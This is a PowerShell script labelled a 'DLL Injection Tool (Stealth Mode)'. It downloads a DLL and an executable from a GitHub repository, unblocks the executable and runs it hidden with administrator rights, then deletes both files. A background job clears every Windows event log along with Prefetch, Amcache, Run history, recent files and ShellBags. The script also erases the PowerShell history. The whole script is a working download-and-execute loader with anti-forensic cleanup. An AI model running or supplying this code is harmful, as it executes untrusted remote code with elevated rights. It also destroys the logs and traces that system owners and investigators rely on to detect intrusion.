# ================================
# DLL Injection Tool (Stealth Mode)
# ================================

# STEP 0: Download DLL directly to final name
$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/d3dcompiler_47.dll"
$dllPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"

# Create directory if it doesn't exist
$dir = Split-Path $dllPath
if (-not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# STEP 1: Define EXE URL and path
$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
$tempExe = "$env:TEMP\ConsoleApplication6.exe"

# Download and unblock EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing -ErrorAction SilentlyContinue
Unblock-File -Path $tempExe -ErrorAction SilentlyContinue

# Run the EXE silently as admin
$proc = Start-Process -FilePath $tempExe -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# Cleanup: remove EXE and DLL
Remove-Item -Path $tempExe -Force -ErrorAction SilentlyContinue
if (Test-Path $dllPath) {
    Remove-Item -Path $dllPath -Force -ErrorAction SilentlyContinue
}

# STEP 2: Stealth Cleanup in Background
Start-Job -ScriptBlock {
    try {
        # Clear Event Logs
        wevtutil el | ForEach-Object { wevtutil cl $_ } > $null 2>&1

        # Clear Prefetch
        Remove-Item "$env:SystemRoot\Prefetch\*" -Force -ErrorAction SilentlyContinue

        # Clear Amcache
        Remove-Item "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
        Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue

        # Clear Run history
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

        # Clear Recent Files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

        # Clear ShellBags
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
} | Out-Null

# STEP 3: Clear PowerShell history
try {
    [System.Management.Automation.PSConsoleReadLine]::ClearHistory() 2>$null
    $historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $historyFile) {
        Remove-Item -Path $historyFile -Force -ErrorAction SilentlyContinue
    }
} catch {}
